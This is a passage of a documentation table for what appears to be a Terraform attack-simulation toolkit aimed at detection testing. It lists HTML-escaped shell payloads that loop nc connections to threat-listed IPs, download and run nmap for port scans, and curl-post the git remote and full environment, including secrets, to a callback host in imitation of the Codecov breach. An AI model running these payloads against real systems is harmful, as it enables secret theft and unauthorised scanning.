                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| target-runbook-connect-badip                             | ./modules/runbook/connect-badip                      | runbook_connect_bad_ip                           | context.azure.runbook.target.connect.badip                        | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;connect&quot;: {<br/>                        &quot;badip&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;iplist_url&quot;: &quot;https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset&quot;,<br/>                            &quot;retry_delay_secs&quot;: 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-badip                      | <pre>locals &amp;&amp;#35;123;<br/>    iplist&amp;&amp;#35;95;url = var&amp;#46;inputs&amp;&amp;#35;91;&quot;iplist&amp;&amp;#35;95;url&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;iplist&amp;&amp;#35;95;base64&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; threatdb&amp;#46;csv<br/>        log &quot;enumerating bad ips in threatdb&amp;#46;csv&quot;<br/>        for i in $&amp;&amp;#35;40;grep &#x27;IPV4,&#x27; threatdb&amp;#46;csv &amp;#124; awk &amp;#45;F&#x27;,&#x27; &#x27;&amp;&amp;#35;123; print $2 &amp;&amp;#35;125;&#x27; &amp;&amp;#35;41;; do log &quot;connecting to: $i&quot;; nc &amp;#45;vv &amp;#45;w 5 $i 80 &gt;&gt; $LOGFILE 2&gt;&amp;1; sleep 1; done;<br/>        log &#x27;waiting $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;retry&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; seconds&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;retry&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    iplist&amp;&amp;#35;95;base64 = file&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/threatdb&amp;#46;csv&quot;&amp;&amp;#35;41;<br/><br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| target-runbook-connect-codecov                           | ./modules/runbook/connect-codecov                    | runbook_connect_codecov                          | context.azure.runbook.target.connect.codecov                      | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;connect&quot;: {<br/>                        &quot;codecov&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;env_secrets&quot;: [<br/>                                &quot;SECRET=supersecret123&quot;<br/>                            ],<br/>                            &quot;git_origin&quot;: &quot;git@git.localhost:repo/repo.git&quot;,<br/>                            &quot;host_ip&quot;: null,<br/>                            &quot;host_port&quot;: 8080,<br/>                            &quot;use_ssl&quot;: false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-codecov                    | <pre>locals &amp;&amp;#35;123;<br/>    host&amp;&amp;#35;95;ip = var&amp;#46;inputs&amp;&amp;#35;91;&quot;host&amp;&amp;#35;95;ip&quot;&amp;&amp;#35;93;<br/>    host&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;host&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    git&amp;&amp;#35;95;origin=var&amp;#46;inputs&amp;&amp;#35;91;&quot;git&amp;&amp;#35;95;origin&quot;&amp;&amp;#35;93;<br/>    env&amp;&amp;#35;95;secrets=join&amp;&amp;#35;40;&quot; &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;env&amp;&amp;#35;95;secrets&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;<br/>    callback&amp;&amp;#35;95;url = var&amp;#46;inputs&amp;&amp;#35;91;&quot;use&amp;&amp;#35;95;ssl&quot;&amp;&amp;#35;93; == true ? &quot;https://$&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;ip&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;port&amp;&amp;#35;125;&quot; : &quot;http://$&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;ip&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;port&amp;&amp;#35;125;&quot;<br/>    command&amp;&amp;#35;95;payload=&lt;&lt;&amp;#45;EOT<br/>    LOGFILE=/tmp/$&amp;&amp;#35;123;basename&amp;&amp;#35;40;path&amp;#46;module&amp;&amp;#35;41;&amp;&amp;#35;125;&amp;&amp;#35;95;command&amp;#46;log<br/>    function log &amp;&amp;#35;123;<br/>        echo &amp;&amp;#35;96;date &amp;#45;u &amp;#43;&quot;%Y&amp;#45;%m&amp;#45;%dT%H:%M:%SZ&quot;&amp;&amp;#35;96;&quot; $1&quot;<br/>        echo &amp;&amp;#35;96;date &amp;#45;u &amp;#43;&quot;%Y&amp;#45;%m&amp;#45;%dT%H:%M:%SZ&quot;&amp;&amp;#35;96;&quot; $1&quot; &gt;&gt; $LOGFILE<br/>    &amp;&amp;#35;125;<br/>    rm &amp;#45;rf /tmp/repo<br/>    mkdir &amp;#45;p /tmp/repo<br/>    cd /tmp/repo<br/>    git init<br/>    git remote add origin $&amp;&amp;#35;123;local&amp;#46;git&amp;&amp;#35;95;origin&amp;&amp;#35;125;<br/>    log &quot;running curl post: curl &amp;#45;sm 0&amp;#46;5 &amp;#45;d &amp;&amp;#35;92;&quot;$&amp;&amp;#35;40;git remote &amp;#45;v&amp;&amp;#35;41;&lt;&lt;&lt;&lt;&lt;&lt; ENV $&amp;&amp;#35;40;env&amp;&amp;#35;41;&amp;&amp;#35;92;&quot; $&amp;&amp;#35;123;local&amp;#46;callback&amp;&amp;#35;95;url&amp;&amp;#35;125;/upload/v2&quot;<br/>    curl &amp;#45;sm 0&amp;#46;5 &amp;#45;d &quot;$&amp;&amp;#35;40;git remote &amp;#45;v&amp;&amp;#35;41;&lt;&lt;&lt;&lt;&lt;&lt; ENV $&amp;&amp;#35;40;env&amp;&amp;#35;41;&quot; $&amp;&amp;#35;123;local&amp;#46;callback&amp;&amp;#35;95;url&amp;&amp;#35;125;/upload/v2 &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    sleep 30<br/>    exit<br/>    EOT<br/>    base64&amp;&amp;#35;95;command&amp;&amp;#35;95;payload=local&amp;#46;command&amp;&amp;#35;95;payload<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        screen &amp;#45;S codecov &amp;#45;X quit<br/>        screen &amp;#45;wipe<br/>        truncate &amp;#45;s 0 /tmp/codecov&amp;#46;log<br/>        log &quot;checking for git&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v git; do<br/>            log &quot;git not found &amp;#45; waiting&quot;<br/>            sleep 10<br/>        done<br/>        log &quot;git: $&amp;&amp;#35;40;command &amp;#45;v  git&amp;&amp;#35;41;&quot;<br/>        screen &amp;#45;d &amp;#45;Logfile /tmp/codecov&amp;#46;log &amp;#45;S codecov &amp;#45;m env &amp;#45;i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $&amp;&amp;#35;123;local&amp;#46;env&amp;&amp;#35;95;secrets&amp;&amp;#35;125; /bin/bash &amp;#45;&amp;#45;noprofile &amp;#45;&amp;#45;norc<br/>        screen &amp;#45;S codecov &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/>        log &#x27;sending screen command: $&amp;&amp;#35;123;local&amp;#46;command&amp;&amp;#35;95;payload&amp;&amp;#35;125;&#x27;;<br/>        screen &amp;#45;S codecov &amp;#45;p 0 &amp;#45;X stuff &quot;echo &#x27;$&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;command&amp;&amp;#35;95;payload&amp;&amp;#35;41;&amp;&amp;#35;125;&#x27; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &amp;#124; /bin/bash &amp;#45;^M&quot;<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;git&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;git&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| target-runbook-connect-nmap-port-scan                    | ./modules/runbook/connect-nmap-port-scan             | runbook_connect_enumerate_host                   | context.azure.runbook.target.connect.nmap_port_scan               | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;connect&quot;: {<br/>                        &quot;nmap_port_scan&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;nmap_scan_host&quot;: &quot;portquiz.net&quot;,<br/>                            &quot;nmap_scan_ports&quot;: [<br/>                                80,<br/>                                443,<br/>                                23,<br/>                                22,<br/>                                8080,<br/>                                3389,<br/>                                27017,<br/>                                3306,<br/>                                6379,<br/>                                5432,<br/>                                389,<br/>                                636,<br/>                                1389,<br/>                                1636<br/>                            ]<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                    | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-nmap-port-scan             | <pre>locals &amp;&amp;#35;123;<br/>    nmap&amp;&amp;#35;95;download = &quot;https://github&amp;#46;com/andrew&amp;#45;d/static&amp;#45;binaries/blob/master/binaries/linux/x86&amp;&amp;#35;95;64/nmap?raw=true&quot;<br/>    nmap&amp;&amp;#35;95;path = &quot;/tmp/nmap&quot;<br/>    nmap&amp;&amp;#35;95;ports = join&amp;&amp;#35;40;&quot;,&quot;,var&amp;#46;inputs&amp;&amp;#35;91;&quot;nmap&amp;&amp;#35;95;scan&amp;&amp;#35;95;ports&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;<br/>    nmap&amp;&amp;#35;95;scan&amp;&amp;#35;95;host = var&amp;#46;inputs&amp;&amp;#35;91;&quot;nmap&amp;&amp;#35;95;scan&amp;&amp;#35;95;host&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        log &quot;scan target: $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;scan&amp;&amp;#35;95;host&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;ports&amp;&amp;#35;125;&quot;<br/>        log &quot;checking for nmap&quot;<br/>        if &amp;#33; command &amp;#45;v nmap; then<br/>            log &quot;nmap not found&quot;<br/>            log &quot;downloading: $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;download&amp;&amp;#35;125;&quot;<br/>            if &amp;&amp;#35;91; &amp;#45;f $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;path&amp;&amp;#35;125; &amp;&amp;#35;93;; then<br/>                curl &amp;#45;L &amp;#45;o $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;path&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;download&amp;&amp;#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>                chmod 755 $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;path&amp;&amp;#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>            fi<br/>            log &quot;using nmap: $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;path&amp;&amp;#35;125;&quot;<br/>            $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;path&amp;&amp;#35;125; &amp;#45;sT &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;ports&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;scan&amp;&amp;#35;95;host&amp;&amp;#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        else<br/>            nmap &amp;#45;sS &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;ports&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;nmap&amp;&amp;#35;95;scan&amp;&amp;#35;95;host&amp;&amp;#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        fi<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
